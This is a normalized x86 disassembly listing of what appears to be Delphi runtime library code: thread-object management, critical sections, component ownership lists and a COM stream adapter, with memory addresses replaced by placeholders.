sub_420c98
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_420d42
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403338
call sub_420a38
mov [ esi + 0xe ] bl
mov [ esi + 0xc ] bl
push esi
push 0x4
lea eax [ esi + 0x8 ]
push eax
mov ecx sub_420bf0
xor edx edx
xor eax eax
call sub_404118
mov ebx eax
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
add esp 0xfffffff0
call sub_4036b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420d49
lea eax [ ebp - 0x10 ]
call sub_404164
retn
call GetLastError
lea edx [ ebp - 0x10 ]
call sub_40b334
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
call sub_403b1c
sub_420d68
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
mov eax [ esi + 0x38 ]
call sub_403368
call sub_420a44
test bl bl
jle r-xdata
push eax
call CloseHandle
mov eax esi
call sub_4210d8
cmp [ esi + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
mov eax esi
call sub_4210e0
mov eax esi
call sub_4210b0
sub_420ddc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ebx edx
xor eax eax
push ebp
push sub_420e4a
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420e51
lea eax [ ebp - 0x14 ]
call sub_404164
retn
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b334
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
call sub_403b1c
sub_420e98
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi + 0x4 ]
push eax
call SetThreadPriority
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_420e58
pop esi
pop ebx
retn
sub_420ec4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0x0
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420fe6
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_420fc8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_418744
call sub_420a2c
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ rw-data ] eax
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_420fa9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call WaitForSingleObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420fb0
push rw-data
call EnterCriticalSection
retn
mov eax [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ rw-data ]
call [ rw-data ]
sub_421004
push ebp
mov ebp esp
mov [ eax + 0x20 ] eax
xor edx edx
mov [ eax + 0x30 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x2c ] edx
lea edx [ eax + 0x20 ]
mov eax [ eax ]
call sub_420ec4
pop ebp
retn 0x8
sub_421044
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0xe ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_421091
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0xe ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SuspendThread
test eax eax
setge dl
mov eax [ ebp - 0x4 ]
call sub_420e58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4210b0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
mov esi eax
test esi esi
setge dl
mov eax ebx
call sub_420e58
dec esi
jne r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xe ] 0x0
sub_4210e0
push ebx
push esi
add esp 0xffffffd8
mov esi eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0xffffffff
mov eax [ esp + 0x8 ]
push eax
call WaitForSingleObject
xor ebx ebx
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x40
push 0x3e8
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x2
call MsgWaitForMultipleObjects
mov ebx eax
cmp ebx 0xffffffff
setne dl
mov eax esi
call sub_420e58
cmp ebx 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call PeekMessageA
test ebx ebx
jne r-xdata
xor eax eax
call sub_420a50
cmp ebx 0x2
jne r-xdata
jmp r-xdata
push esp
mov eax [ esp + 0x8 ]
push eax
call GetExitCodeThread
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_420e58
mov eax [ esp ]
add esp 0x28
pop esi
pop ebx
retn
sub_421184
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_42133c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4211d0
push ebx
push esi
push ecx
call sub_40371c
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_421424
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_4213cc
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_418e88
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_421394
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_403704
lea eax [ ebx + 0x14 ]
call sub_40d490
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_4188a0
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_421254
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4188fc
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_418744
mov edx ebx
mov eax esi
call sub_421254
sub_4212e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_418744
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0x10 ] eax
sub_421314
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_418a3c
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403368
xor eax eax
mov [ ebx + 0x10 ] eax
sub_42133c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403564
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_4212e8
mov dl 0x1
mov eax ebx
call sub_42185c
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_42180c
sub_421394
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_42185c
mov edx ebx
mov eax esi
call sub_421314
pop edi
pop esi
pop ebx
retn
sub_4213cc
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_418988
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_421394
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_421314
sub_421424
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_4188a0
call sub_421424
inc edi
dec esi
jne r-xdata
sub_421460
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_418a3c
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403368
xor eax eax
mov [ ebx + 0x14 ] eax
sub_421484
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_421460
mov edx ebx
mov eax esi
call sub_421460
pop esi
pop ebx
retn
sub_4214a0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_421484
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4188a0
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_4214fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_4212a8
push ebx
push sub_4212d0
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_4212bc
push ebx
push sub_4212dc
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_4215f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_408184
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_42168c
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
call sub_403b1c
sub_42168c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_4188a0
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_408184
test al al
jne r-xdata
sub_4216dc
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_404570
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_4082a0
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
call sub_403b1c
xor edx edx
mov eax ebx
call sub_42185c
mov edx esi
mov eax ebx
call sub_421768
mov dl 0x1
mov eax ebx
call sub_42185c
sub_42177c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4188a0
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41882c
sub_4217b8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_4188fc
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418790
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_41891c
sub_42180c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4217a8
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_42177c
mov cl 0x1
mov edx ebx
call sub_42180c
inc edi
dec ebp
jne r-xdata
sub_42185c
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404400
mov edx esp
mov eax esi
call sub_403664
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_4218a4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_4218cc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_421914
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_40341c
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421974
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_421998
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403338
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4219e0
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
mov edx esi
call sub_421c10
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_421a48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_421c10
mov edx ebx
mov eax esi
call sub_421c04
sub_421a8c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421184
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_421ad0
push ebx
push esi
push edi
call sub_40371c
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4211d0
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_421484
jmp r-xdata
mov eax esi
call sub_418988
mov edx eax
mov eax edi
call sub_421c10
lea eax [ edi + 0x50 ]
call sub_40d490
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403704
sub_421b30
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4214a0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_421b5c
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_421b78
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_421b94
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_4188a0
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_421c10
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_418790
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4188a0
cmp ebp eax
jne r-xdata
sub_421c50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_421484
mov edx ebx
call sub_421254
sub_421c7c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403338
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_421cc4
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403368
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_421cfc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_421d4b
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421d64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_421db3
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421dcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_421e36
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_421e50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_421e99
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41ad9c
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_421eb4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405b78
xor eax eax
push ebp
push sub_4220a1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_42207a
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026ec
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_422069
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40270c
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
